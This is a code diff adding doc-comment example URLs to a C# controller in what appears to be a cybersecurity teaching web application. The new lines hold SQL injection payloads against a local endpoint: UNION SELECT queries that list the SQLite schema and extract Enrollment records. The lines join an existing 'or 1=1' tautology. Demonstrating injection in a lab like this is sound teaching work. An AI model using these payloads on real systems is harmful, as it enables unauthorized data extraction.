@@ -36,6 +36,12 @@ namespace CyberSecurity3WebApplication.Controllers
         /// <summary>
         /// https://localhost:44365/school/Example100_FindByStudentLastName?studentLastName=Alexander
         /// https://localhost:44365/school/Example100_FindByStudentLastName?studentLastName=Alexander%27%20or%201=1%20--
+        /// 
+        /// https://localhost:44365/school/Example100_FindByStudentLastName?studentLastName=bla%27%20union%20select%201,null,null,null%20from%20sqlite_schema%20--
+        /// 
+        /// https://localhost:44365/school/Example100_FindByStudentLastName?studentLastName=bla%27%20union%20select%20rootpage,type,name,sql%20from%20sqlite_schema%20--
+        /// 
+        /// https://localhost:44365/school/Example100_FindByStudentLastName?studentLastName=bla%27%20union%20select%20EnrollmentID,CourseID,StudentID,Grade%20from%20Enrollment%20--
         /// </summary>
         /// <param name="studentLastName"></param>
         /// <returns></returns>
